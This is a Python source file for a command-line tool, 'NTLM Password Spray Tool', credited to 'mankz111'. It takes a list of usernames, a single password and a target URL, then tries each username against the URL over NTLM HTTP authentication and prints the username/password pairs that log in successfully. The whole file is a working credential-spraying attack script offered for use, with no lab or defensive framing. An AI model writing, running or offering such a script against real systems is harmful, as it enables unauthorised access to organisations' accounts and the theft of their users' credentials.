import requests
from requests_ntlm import HttpNtlmAuth
import argparse

class ntlmScript:
    def __init__(self, fqdn):
        self.HTTP_AUTH_FAILED_CODE = 401
        self.HTTP_AUTH_SUCCEED_CODE = 200
        self.verbose = True
        self.fqdn = fqdn


    def load_users(self, args):
        try:
            with open(args.wordlist, 'r') as users:
                return [user.strip() for user in users if user.strip()]
        except FileNotFoundError:
            print("Wordlist not found!")
            return []
    
    def password_spray(self, users, args):
        count = 0
        valid_list = []
        for user in users:
            r = requests.get(args.url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, args.password))

            if r.status_code == self.HTTP_AUTH_SUCCEED_CODE:
                print(f"[+] Valid credential pair found! Username: {user} Password: {args.password}")
                valid_list.append(f"User: {user} - Password: {args.password}")
                count += 1
                continue
            if self.verbose:
                if(r.status_code == self.HTTP_AUTH_FAILED_CODE):
                    print (f"[-] Failed login with Username: {user}")
        print (f"[*] Password spray attack completed, {count} valid credential pairs found: \n")
        if valid_list:
        	for pair in valid_list:
        		print(f"[*] Valid credential pairs found {pair}")
        
        


def the_parser():
        parser = argparse.ArgumentParser(
            description="ntlm password spray", 
        )
        parser.add_argument("-w", "--wordlist", required=True,  help="Path to the wordlist file.")
        parser.add_argument("-p", "--password", required=True, help="Password to use.")
        parser.add_argument("-u", "--url", required=True, help="Target URL.")
        parser.add_argument("-f", "--fqdn", required=True, help="DOMAINuser")
        args = parser.parse_args()
        return args


def show_banner():
    banner = r"""
 _   _ _____ _      ___  ___  _____                      
| \ | |_   _| |     |  \/  | /  ___|                     
|  \| | | | | |     | .  . | \ `--. _ __  _ __ __ _ _   _ 
| . ` | | | | |     | |\/| |  `--. \ '_ \| '__/ _` | | | |
| |\  | | | | |____ | |  | | /\__/ / |_) | | | (_| | |_| |
\_| \_/ \_/ \_____/ \_|  |_/ \____/| .__/|_|  \__,_|\__, |
                                   | |               __/ |
                                   |_|              |___/ 
    [*] NTLM Password Spray Tool
    [*] Autor: mankz111 / @Mankz111
    """
    print(banner)

if __name__ == "__main__":
    show_banner()
    args = the_parser()
    app = ntlmScript(fqdn=args.fqdn)
    users = app.load_users(args)
    if users:
        app.password_spray(users, args)






    








